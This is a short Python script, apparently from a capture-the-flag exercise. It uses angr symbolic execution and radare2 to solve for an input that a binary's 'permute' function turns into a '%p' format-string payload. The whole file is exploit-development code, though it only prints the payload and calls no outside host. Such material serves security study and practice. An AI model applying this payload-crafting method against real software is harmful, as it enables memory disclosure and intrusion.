#!/usr/bin/env python3

from pwn import *
from binascii import unhexlify
import angr
import claripy
import r2pipe

exe = context.binary = ELF('vuln')

r = r2pipe.open(exe.path)
r.cmd('aaa')
ret = r.cmdj('pdfj @ sym.permute')['ops'][-1]['offset']

p = angr.Project(exe.path)

payload_chars = [claripy.BVS("byte_%d" % i, 8) for i in range(0x200)]
payload = claripy.Concat(*payload_chars + [claripy.BVV(b'\n')])
payload_addr = 0

s = p.factory.call_state(exe.sym['permute'], payload_addr,
        add_options=set.union(
            angr.options.unicorn,
            {
                angr.options.LAZY_SOLVES,
                angr.options.ZERO_FILL_UNCONSTRAINED_MEMORY,
                angr.options.ZERO_FILL_UNCONSTRAINED_REGISTERS,
            }))

s.memory.store(payload_addr, payload)

sim = p.factory.simgr(s)

sim.explore(find=ret)

fmt = "%p"

if sim.found:
    sol = sim.found[0]

    payload_out = sol.memory.load(
            payload_addr,
            len(fmt) + 1
            )

    sol.add_constraints(payload_out == fmt.encode() + b'\0')

    print(sol.solver.eval(payload, cast_to=bytes))
else:
    print("no solution")

